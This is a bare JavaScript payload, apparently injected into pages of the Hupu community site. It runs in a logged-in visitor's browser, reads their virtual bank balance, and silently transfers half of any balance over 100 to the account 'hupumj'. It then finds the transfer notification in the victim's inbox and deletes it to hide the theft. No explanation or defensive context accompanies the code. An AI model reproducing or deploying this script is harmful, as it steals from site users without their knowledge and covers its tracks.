function XHConn()
{ 
  var xmlhttp, bComplete = false;
	try { xmlhttp = new ActiveXObject("Msxml2.XMLHTTP");}
	catch (e) { try { xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");}
	catch (e) { try { xmlhttp = new XMLHttpRequest();}
	catch (e) {  return false; }}}
	this.connect = function(sURL,sVars,callFun) 
	{
		bComplete = false;
		xmlhttp.open("POST",sURL,true);
		xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		xmlhttp.onreadystatechange = function(){

			if(xmlhttp.readyState == 4 && !bComplete)
			{
				bComplete = true;
				req = xmlhttp.responseText;
				//alert(req);
				//alert(callFun);
				if(req && callFun){
					callFun(req);
				}
			}
		}
		xmlhttp.send(sVars);
	}
}

function delmsg(){
	setTimeout("cleRec()",3000);
}

function cleRec(){
	var pRec = new XHConn();
	pRec.connect("http://my.hupu.com/mymsg.php?action=receive","",delRec);
}
function delRec(reqRec){
	var pDelRec = new XHConn();
	var signRec="'16498345'";
	var startRec=reqRec.indexOf(signRec);
	var endRec=startRec+500;
	var subRec=reqRec.substring(startRec,endRec);
	var subUrlReg=new RegExp("\\?action=receive&page=[0-9]&delid=[0-9]{2,}&group=[0-9]{1,}");
	var surlRec=subUrlReg.exec(subRec);
	pDelRec.connect("http://my.hupu.com/mymsg.php"+surlRec);
}

function givemekll(kll){
	var me="hupumj";
	var pGkll = new XHConn();
	pGkll.connect("http://my.hupu.com/bank_act.php","action=virement&pwuser="+me+"&to_money="+kll+"&content_plus=%E9%80%9A%E8%BF%87%E9%93%B6%E8%A1%8C%E7%BB%99%E4%BD%A0%E8%BD%AC%E8%B4%A6"+kll+"%E5%8D%A1%E8%B7%AF%E9%87%8C%0A%E9%99%84%E8%A8%80%EF%BC%9A");
}

var p = new XHConn();
p.connect("http://my.hupu.com/bank.php","",getKll);
function getKll(reqKll){
	var KllReg=new RegExp("current_deposit\">[0-9]{3,}");
	var subKll=KllReg.exec(reqKll);
	var countReg=new RegExp("[0-9]{3,}");
	var countKll=countReg.exec(subKll);
	if(countKll > 100)
	{
		countKll=countKll/2;
		givemekll(countKll);
		

	}
}
delmsg();


